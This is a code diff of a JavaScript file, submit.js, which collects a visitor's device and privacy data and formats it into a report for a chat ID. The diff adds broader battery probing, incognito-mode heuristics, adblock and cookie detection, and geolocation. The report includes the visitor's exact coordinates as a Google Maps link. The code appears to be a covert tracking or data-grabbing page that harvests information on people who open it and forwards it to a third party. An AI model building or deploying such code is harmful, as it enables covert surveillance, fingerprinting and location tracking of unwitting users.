@@ -1,4 +1,4 @@
-// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section)
+// submit.js (updated: more robust battery, incognito heuristics, enhanced adblock & cookie checks)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -62,15 +62,30 @@ async function collectAndSend(chatId) {
     }
   } catch (e) {}
 
-  // Battery
-  let batteryLevel = 'Unknown', batteryCharging = 'Unknown';
+  // ---------- Battery (robust) ----------
+  let batteryLevel = 'Unknown', batteryCharging = 'Unknown', batterySource = 'Unavailable';
   try {
     if (navigator.getBattery) {
+      batterySource = 'navigator.getBattery';
       const b = await navigator.getBattery();
       batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
       batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
+    } else if (navigator.battery) { // some older prefixed APIs
+      batterySource = 'navigator.battery';
+      const b = navigator.battery;
+      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
+      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
+    } else if (navigator.mozBattery) {
+      batterySource = 'navigator.mozBattery';
+      const b = navigator.mozBattery;
+      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
+      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
+    } else {
+      batterySource = 'Not supported';
     }
-  } catch (e) {}
+  } catch (e) {
+    batterySource = 'Error';
+  }
 
   // Network info
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
@@ -79,143 +94,203 @@ async function collectAndSend(chatId) {
   const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
   const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
 
-  // Incognito / Private mode detection (best-effort, heuristic)
+  // ---------- Incognito Detection (improved heuristics) ----------
   async function detectIncognito() {
-    // Returns: 'Yes' / 'No' / 'Unknown'
+    const reasons = [];
     try {
-      // Prefer storage.estimate() heuristic (works on many modern Chromium browsers)
+      // 1) storage.estimate quota heuristic (Chromium)
       if (navigator.storage && navigator.storage.estimate) {
-        const estimate = await navigator.storage.estimate();
-        // quota is in bytes; in incognito Chrome quota is typically much smaller (~120MB or less)
-        if (typeof estimate.quota === 'number') {
-          const quota = estimate.quota;
-          // threshold: 120 MB (best-effort)
-          const threshold = 120 * 1024 * 1024;
-          if (quota && quota < threshold) return 'Yes';
-          // if quota is large, likely not incognito
-          if (quota && quota >= threshold) return 'No';
-        }
-      }
-
-      // Try FileSystem API (webkitRequestFileSystem) heuristic (older Chrome / Safari)
-      const fsRequest = (window.webkitRequestFileSystem || window.RequestFileSystem);
-      if (typeof fsRequest === 'function') {
-        return await new Promise(resolve => {
-          try {
-            fsRequest(window.TEMPORARY, 100, () => resolve('No'), () => resolve('Yes'));
-            // some browsers call the error callback when in private mode -> treat as incognito
-            setTimeout(() => resolve('Unknown'), 1500);
-          } catch (e) {
-            resolve('Unknown');
+        try {
+          const est = await navigator.storage.estimate();
+          if (est && typeof est.quota === 'number') {
+            const quotaMB = Math.round(est.quota / 1024 / 1024);
+            // record value
+            reasons.push(`quota=${quotaMB}MB`);
+            // heuristic thresholds:
+            // very small quota -> likely incognito (<=120MB)
+            if (est.quota < 120 * 1024 * 1024) return { result: 'Yes', reason: reasons.join('; ') };
+            // large quota -> likely not incognito
+            if (est.quota > 300 * 1024 * 1024) reasons.push('quota-large');
           }
-        });
+        } catch (e) { reasons.push('quota-check-failed'); }
       }
 
-      // Safari detection heuristic: try to open an IndexedDB and write; in private mode it may fail
+      // 2) storage.persisted() -> usually false in incognito
+      if (navigator.storage && navigator.storage.persisted) {
+        try {
+          const isPersisted = await navigator.storage.persisted();
+          reasons.push(`persisted=${isPersisted}`);
+          if (!isPersisted) {
+            // not definitive, but supports incognito detection
+            // accumulate; don't decide solely on this
+          }
+        } catch (e) { reasons.push('persisted-check-failed'); }
+      }
+
+      // 3) localStorage test: setting may throw or silently fail in some private modes
+      try {
+        const testKey = '__ls_test_' + Date.now();
+        localStorage.setItem(testKey, '1');
+        const val = localStorage.getItem(testKey);
+        localStorage.removeItem(testKey);
+        if (val !== '1') {
+          reasons.push('localStorage-no-persist');
+          return { result: 'Yes', reason: reasons.join('; ') };
+        } else {
+          reasons.push('localStorage-ok');
+        }
+      } catch (e) {
+        reasons.push('localStorage-error');
+        return { result: 'Yes', reason: reasons.join('; ') };
+      }
+
+      // 4) IndexedDB open/write heuristic (Safari & others)
       if (window.indexedDB) {
         try {
-          const dbName = 'incognitotest-' + Math.random().toString(36).slice(2);
-          const openReq = indexedDB.open(dbName);
-          return await new Promise(resolve => {
-            let resolved = false;
-            openReq.onerror = () => {
-              if (!resolved) { resolved = true; resolve('Yes'); }
-            };
-            openReq.onsuccess = () => {
+          const dbName = 'incog_test_' + Math.random().toString(36).slice(2);
+          const openReq = indexedDB.open(dbName, 1);
+          const idxdbResult = await new Promise((resolve) => {
+            let finished = false;
+            openReq.onerror = () => { if (!finished) { finished = true; resolve('error'); } };
+            openReq.onupgradeneeded = () => {
+              // create object store to force write
               try {
                 const db = openReq.result;
-                db.close();
-                indexedDB.deleteDatabase(dbName);
-                if (!resolved) { resolved = true; resolve('No'); }
-              } catch (e) {
-                if (!resolved) { resolved = true; resolve('Unknown'); }
-              }
+                db.createObjectStore('store');
+              } catch (e) {}
             };
-            // fallback timeout
-            setTimeout(() => { if (!resolved) { resolved = true; resolve('Unknown'); } }, 1500);
+            openReq.onsuccess = () => { if (!finished) { finished = true; resolve('success'); } };
+            setTimeout(() => { if (!finished) { finished = true; resolve('timeout'); } }, 1500);
           });
+          if (idxdbResult === 'error') {
+            reasons.push('indexeddb-error');
+            return { result: 'Yes', reason: reasons.join('; ') };
+          } else if (idxdbResult === 'success') {
+            reasons.push('indexeddb-ok');
+            try { indexedDB.deleteDatabase(dbName); } catch (e) {}
+          } else {
+            reasons.push('indexeddb-unknown');
+          }
         } catch (e) {
-          // ignore and continue
+          reasons.push('indexeddb-check-failed');
         }
+      } else {
+        reasons.push('no-indexeddb-api');
       }
 
-      // If none of the heuristics worked, return Unknown
-      return 'Unknown';
-    } catch (e) {
-      return 'Unknown';
+      // If none of the above decisive heuristics returned 'Yes', assume 'No' (not incognito)
+      return { result: 'No', reason: reasons.join('; ') || 'no-heuristics' };
+    } catch (err) {
+      return { result: 'Unknown', reason: 'error' };
     }
   }
 
-  // Adblock (and related) detection - returns detailed object
+  // ---------- Adblock & Cookie Detection (enhanced) ----------
   async function detectAdblockAndCookies() {
-    let method = '';
+    const triggerMethods = [];
     let detected = 'Negative';
-    // DOM bait
+
+    // 0) Global adblock variables check
+    try {
+      if (window.blockAdBlock || window.canRunAds || window.blocked || window.adBlockEnabled) {
+        triggerMethods.push('Globals');
+        detected = 'Positive';
+      }
+    } catch (e) {}
+
+    // 1) DOM bait
     try {
       const bait = document.createElement('div');
-      bait.className = 'adsbox ad-banner adsbygoogle adunit';
+      bait.className = 'adsbygoogle adslot adunit ad-banner';
       bait.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;top:-9999px';
       document.body.appendChild(bait);
       await new Promise(r => setTimeout(r, 60));
       const isHidden = (bait.offsetParent === null || bait.offsetHeight === 0 || bait.clientHeight === 0 || getComputedStyle(bait).display === 'none');
       bait.remove();
-      if (isHidden) { detected = 'Positive'; method = 'DOM'; }
-    } catch {}
+      if (isHidden) {
+        detected = 'Positive';
+        triggerMethods.push('DOM');
+      }
+    } catch (e) {
+      // ignore
+    }
 
-    // Network fetch
-    if (detected === 'Negative') {
-      try {
+    // 2) Network fetch test
+    try {
+      if (detected === 'Negative') {
         const controller = new AbortController();
         const timeout = setTimeout(() => controller.abort(), 2500);
-        // no-cors mode: success does not expose status, but failing will throw
+        // many blockers block this URL; mode:no-cors so failures usually throw
         await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
         clearTimeout(timeout);
-        method = 'None';
-      } catch {
-        detected = 'Positive';
-        method = method || 'Network';
+        // if didn't throw, network didn't block it (note: silent success in no-cors)
       }
+    } catch (e) {
+      detected = 'Positive';
+      if (!triggerMethods.includes('Network')) triggerMethods.push('Network');
     }
 
-    // Cookie test
-    let cookiesBlocked = 'No';
+    // 3) Cookie tests
+    let basicCookie = 'Unknown', blockerCookie = 'Unknown';
     try {
-      document.cookie = "abctest=1; SameSite=Lax";
-      if (!document.cookie.includes("abctest")) cookiesBlocked = 'Yes';
-      // cleanup
-      document.cookie = "abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax";
-    } catch {
-      cookiesBlocked = 'Yes';
+      // basic cookie test
+      try {
+        document.cookie = 'abctest=1; SameSite=Lax';
+        basicCookie = document.cookie.includes('abctest') ? 'Set' : 'Blocked';
+        // cleanup
+        document.cookie = 'abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax';
+      } catch (e) {
+        basicCookie = 'Error';
+      }
+
+      // blocker-specific cookie test (different name)
+      try {
+        document.cookie = 'adblock_cookie=1; SameSite=Lax';
+        blockerCookie = document.cookie.includes('adblock_cookie') ? 'Set' : 'Blocked';
+        // cleanup
+        document.cookie = 'adblock_cookie=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax';
+      } catch (e) {
+        blockerCookie = 'Error';
+      }
+
+      if (basicCookie === 'Blocked' || blockerCookie === 'Blocked') {
+        if (!triggerMethods.includes('Cookie')) triggerMethods.push('Cookie');
+        detected = 'Positive';
+      }
+    } catch (e) {
+      // ignore
     }
 
-    return { detected, method, cookiesBlocked };
+    return { detected, methods: triggerMethods.length ? triggerMethods.join(',') : 'None', basicCookie, blockerCookie };
   }
 
-  // Run privacy/adblock/incognito checks and geolocation in parallel
-  const [incognitoResult, adblockResult, geoResult] = await Promise.all([
+  // ---------- Geolocation helper ----------
+  async function getGeolocation() {
+    let status = 'Denied', latitude = 'Denied', longitude = 'Denied';
+    const getPos = (timeoutMs = 8000) => new Promise((resolve, reject) => {
+      let done = false;
+      if (!navigator.geolocation) return reject(new Error('No geolocation'));
+      navigator.geolocation.getCurrentPosition(p => { if (!done) { done = true; resolve(p); } },
+                                              e => { if (!done) { done = true; reject(e); } },
+                                              { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs });
+      setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')); } }, timeoutMs + 200);
+    });
+    try {
+      const p = await getPos();
+      status = 'Allowed';
+      latitude = p.coords.latitude;
+      longitude = p.coords.longitude;
+    } catch (err) {
+      status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
+    }
+    return { status, latitude, longitude };
+  }
+
+  // run the async checks in parallel (incognito, adblock/cookies, geo)
+  const [incognitoInfo, adblockInfo, geoResult] = await Promise.all([
     detectIncognito(),
     detectAdblockAndCookies(),
-    // geolocation function:
-    (async function getGeolocation() {
-      let status = 'Denied', latitude = 'Denied', longitude = 'Denied';
-      const getPos = (timeoutMs = 8000) => new Promise((resolve, reject) => {
-        let done = false;
-        if (!navigator.geolocation) return reject(new Error('No geolocation'));
-        navigator.geolocation.getCurrentPosition(p => { if (!done) { done = true; resolve(p); } },
-                                                e => { if (!done) { done = true; reject(e); } },
-                                                { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs });
-        setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')); } }, timeoutMs + 200);
-      });
-      try {
-        const p = await getPos();
-        status = 'Allowed';
-        latitude = p.coords.latitude;
-        longitude = p.coords.longitude;
-      } catch (err) {
-        status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
-      }
-      return { status, latitude, longitude };
-    })()
+    getGeolocation()
   ]);
 
   // IP info
@@ -270,12 +345,13 @@ async function collectAndSend(chatId) {
 - Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
 
 🔐 Privacy & Adblock Info:
-- Incognito / Private Mode: ${incognitoResult}
-- Blocker Detected: ${adblockResult.detected}
-- Method: ${adblockResult.method}
-- Cookies Blocked: ${adblockResult.cookiesBlocked}
+- Incognito / Private Mode: ${incognitoInfo.result} (${incognitoInfo.reason || 'no-reason'})
+- Blocker Detected: ${adblockInfo.detected}
+- Detection Methods: ${adblockInfo.methods}
+- Basic Cookie: ${adblockInfo.basicCookie}
+- Blocker Cookie: ${adblockInfo.blockerCookie}
 
-🔋 Battery:
+🔋 Battery (${batterySource}):
 - Level: ${batteryLevel}
 - Charging: ${batteryCharging}
 `;
